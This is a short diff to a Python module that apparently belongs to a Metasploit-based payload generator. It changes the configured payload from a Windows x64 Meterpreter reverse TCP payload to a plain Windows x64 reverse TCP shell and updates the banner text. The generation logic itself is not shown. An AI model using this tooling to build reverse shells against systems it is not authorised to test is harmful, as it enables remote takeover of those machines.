@@ -1,4 +1,4 @@
-#Import
+# Import
 from lib import core, gen
 
 
@@ -6,12 +6,12 @@ def Construction():
 
     ARCH = "x64"
     PROTOCOLE = "TCP"
-    TYPE = "Meterpreter"
+    TYPE = "Shell"
     PLATFORM = "Windows"
-    
-    RC_PAYLOAD = "windows/x64/meterpreter/reverse_tcp"
 
-    print(core.amcolors.PURPLE + core.amcolors.PURPLE + "Payload x64 Meterpreter Reverse TCP")
+    RC_PAYLOAD = "windows/x64/shell/reverse_tcp"
+
+    print(core.amcolors.PURPLE + core.amcolors.PURPLE + "Payload x64 Shell Reverse TCP")
 
     Gen_Payload = True
 
@@ -56,4 +56,5 @@ def Construction():
 
         print(core.amcolors.GREEN + core.amcolors.BOLD + "\n[+] Complete task." + core.amcolors.ENDC)
         print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Exiting script." + core.amcolors.ENDC)
+
         Gen_Payload = False
